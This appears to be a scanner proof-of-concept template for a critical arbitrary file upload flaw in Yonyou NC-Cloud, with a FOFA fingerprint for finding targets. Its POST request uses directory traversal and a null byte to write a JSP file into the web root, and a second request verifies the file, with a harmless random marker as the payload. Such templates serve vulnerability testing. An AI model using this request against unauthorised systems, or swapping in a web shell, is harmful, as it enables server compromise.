id: poc-yaml-yongyou-nc-cloud-doPost-anyfile-upload
info:
  name: 用友NC-Cloud doPost 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 用友-NC-Cloud
  fofa: body="/Client/Uclient/UClient.exe"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\..\..\webapps\nc_web\{{.t1}}.jsp%00
  headers:
    Content-Type: application/octet-stream
  data: '{{.t2}}'
  expression: status_code == 200 && body == ""
- method: GET
  path: /{{.t1}}.jsp
  expression: status_code == 200 && contains(body,t2) && contains(body,"xml version=\"1.0\"")
    && contains(content_type,"text/html")
transport: http
